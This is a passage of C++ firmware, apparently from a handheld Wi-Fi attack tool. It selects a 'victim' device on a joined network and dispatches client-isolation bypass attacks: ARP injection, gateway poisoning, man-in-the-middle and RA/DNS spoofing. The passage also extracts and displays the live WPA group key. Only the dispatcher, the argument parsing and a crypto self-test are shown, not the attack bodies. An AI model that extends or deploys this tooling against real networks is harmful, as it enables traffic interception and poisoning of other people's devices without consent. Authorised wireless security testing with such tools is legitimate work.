        case ISO_INJECT:   isoInjectArp(idx); return;
        case ISO_PORTUP:   isoGwPoison(idx);  return;
        case ISO_MITM:     isoMitm(idx);      return;
        case ISO_BOUNCE:   isoBounce(idx);    return;
        case ISO_PORTDOWN: isoPortDown(idx);  return;
        case ISO_RADNS:    isoRaDns(idx);     return;
        case ISO_AUTO:     isoSmartAuto(idx); return;
        default: break;                       // ISO_BCAST falls through
    }
    // bcast: a to-DS broadcast frame would need our PAIRWISE key (PTK) to be
    // accepted by the AP, which raw 80211_tx can't supply — so it's not separately
    // injectable. The same "is the victim reachable" question is answered by
    // 'inject' (GTK broadcast) and 'bounce' (IP layer via gateway).
    isoHeader("bcast");
    dm.setTextColor(TFT_YELLOW); dm.println("Not separately injectable:");
    dm.setTextColor(0x7BEF);     dm.println("a to-DS frame needs our pairwise");
    dm.println("key (PTK), which raw TX can't add.");
    dm.println("");
    dm.setTextColor(TFT_WHITE);  dm.println("Use 'inject' or 'bounce' instead");
    dm.println("to test victim reachability.");
    dm.printCommandScreen();
}

// ── is cctest — validate the CCMP engine on-device (no transmit) ─────────────────
// Runs the round-trip self-test, then shows the live GTK if associated. This is
// the safe way to prove the inject crypto works before any frame goes on the air.
static void isoCcmpTest() {
    auto& dm = displayManager;
    isoHeader("CCMP self-test");
    bool pass = isoCcmpSelfTest();
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
    dm.printText("AES-CCMP round-trip:");
    dm.setTextColor(pass ? TFT_GREEN : TFT_RED);
    dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText(pass ? "PASS" : "FAIL");

    uint8_t gtk[32]; int len = 0;
    int y = outputY + LINE_HEIGHT * 5;
    if (WiFi.status() == WL_CONNECTED && netspyGetGtk(gtk, &len)) {
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("live GTK:"); y += LINE_HEIGHT;
        char row[48]; int n = 0;
        for (int i = 0; i < len; i++) {
            n += snprintf(row + n, sizeof(row) - n, "%02X ", gtk[i]);
            if ((i & 7) == 7) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); y += LINE_HEIGHT; n = 0; }
        }
        if (n) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); }
    } else {
        dm.setTextColor(0x7BEF); dm.setCursor(6, y);
        dm.printText(WiFi.status() == WL_CONNECTED ? "GTK unreadable (offset?)"
                                                   : "connect to see live GTK");
    }
    dm.printCommandScreen();
}

// ── entry ────────────────────────────────────────────────────────────────────────
void runIsoscan(char* args) {
    auto& dm = displayManager;
    if (args && (args[0] == 'c' || args[0] == 'C')) { isoCcmpTest(); return; }
    if (WiFi.status() != WL_CONNECTED) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("Connect first:  cw <ssid>");
        dm.setTextColor(0x7BEF);    dm.println("(needs to be on the target net)");
        dm.printCommandScreen();
        return;
    }
    if (netspyDeviceCount() <= 0) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("No devices discovered.");
        dm.setTextColor(0x7BEF);    dm.println("Run 'ns' first to find victims,");
        dm.setTextColor(0x7BEF);    dm.println("then 'is' to attack one.");
        dm.printCommandScreen();
        return;
    }

    // Parse args: optional `ns<#>` victim index + optional attack keyword.
    int victim = -1;
    IsoAttack attack = ISO_NONE;
    if (args && args[0]) {
        char buf[64]; strncpy(buf, args, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
        for (char* tok = strtok(buf, " "); tok; tok = strtok(nullptr, " ")) {
            if ((tok[0] == 'n' || tok[0] == 'N') && (tok[1] == 's' || tok[1] == 'S') &&
                isdigit((unsigned char)tok[2])) {
                victim = atoi(tok + 2);
            } else {
                IsoAttack a = isoAttackFromKey(tok);
                if (a != ISO_NONE) attack = a;
            }
        }
    }

    // Victim: use the CLI index if valid, else open the picker.
    if (victim < 0 || victim >= netspyDeviceCount()) {
        victim = isoPickVictim();
        if (victim < 0) { dm.clearScreen(); dm.printCommandScreen(); return; }
    }

    // Attack: use the CLI keyword, else open the menu.
    if (attack == ISO_NONE) {
        attack = isoAttackMenu(victim);
        if (attack == ISO_NONE) { dm.clearScreen(); dm.printCommandScreen(); return; }
    }

    if (!isoConfirm(victim, attack)) { dm.clearScreen(); dm.printCommandScreen(); return; }
    isoRunAttack(victim, attack);
}
